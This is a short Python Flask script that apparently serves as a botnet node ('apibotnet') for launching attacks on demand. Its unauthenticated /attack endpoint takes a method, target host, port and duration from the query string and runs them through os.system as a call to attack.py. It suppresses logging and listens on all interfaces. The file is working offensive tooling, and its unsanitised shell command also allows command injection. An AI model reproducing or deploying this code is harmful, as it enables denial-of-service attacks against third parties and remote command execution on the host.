from flask import Flask,request
import requests
from os import system
from threading import Thread
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)

def run(command):Thread(target=system,args=(command,)).start()

ip = requests.get('https://ipinfo.io/json').json()['ip']

@app.route('/')
def index():
    return 'hello apibotnet'

@app.route('/attack')
def attack():
    method = request.args.get('method')
    host = request.args.get('host')
    port = request.args.get('port')
    time = request.args.get('time')
    run(f'python attack.py {method} {host} {port} {time}')
    return "True"

if __name__ == '__main__':
    print(f'''\x1b[38;2;255;20;147m
    ╦  ╦╔╦╗╔═╗╔╗╔
    ╚╗╔╝ ║ ║╣ ║║║
     ╚╝  ╩ ╚═╝╝╚╝
          
Host: {ip} 
    ''')
    app.run(host='0.0.0.0',port=8082)
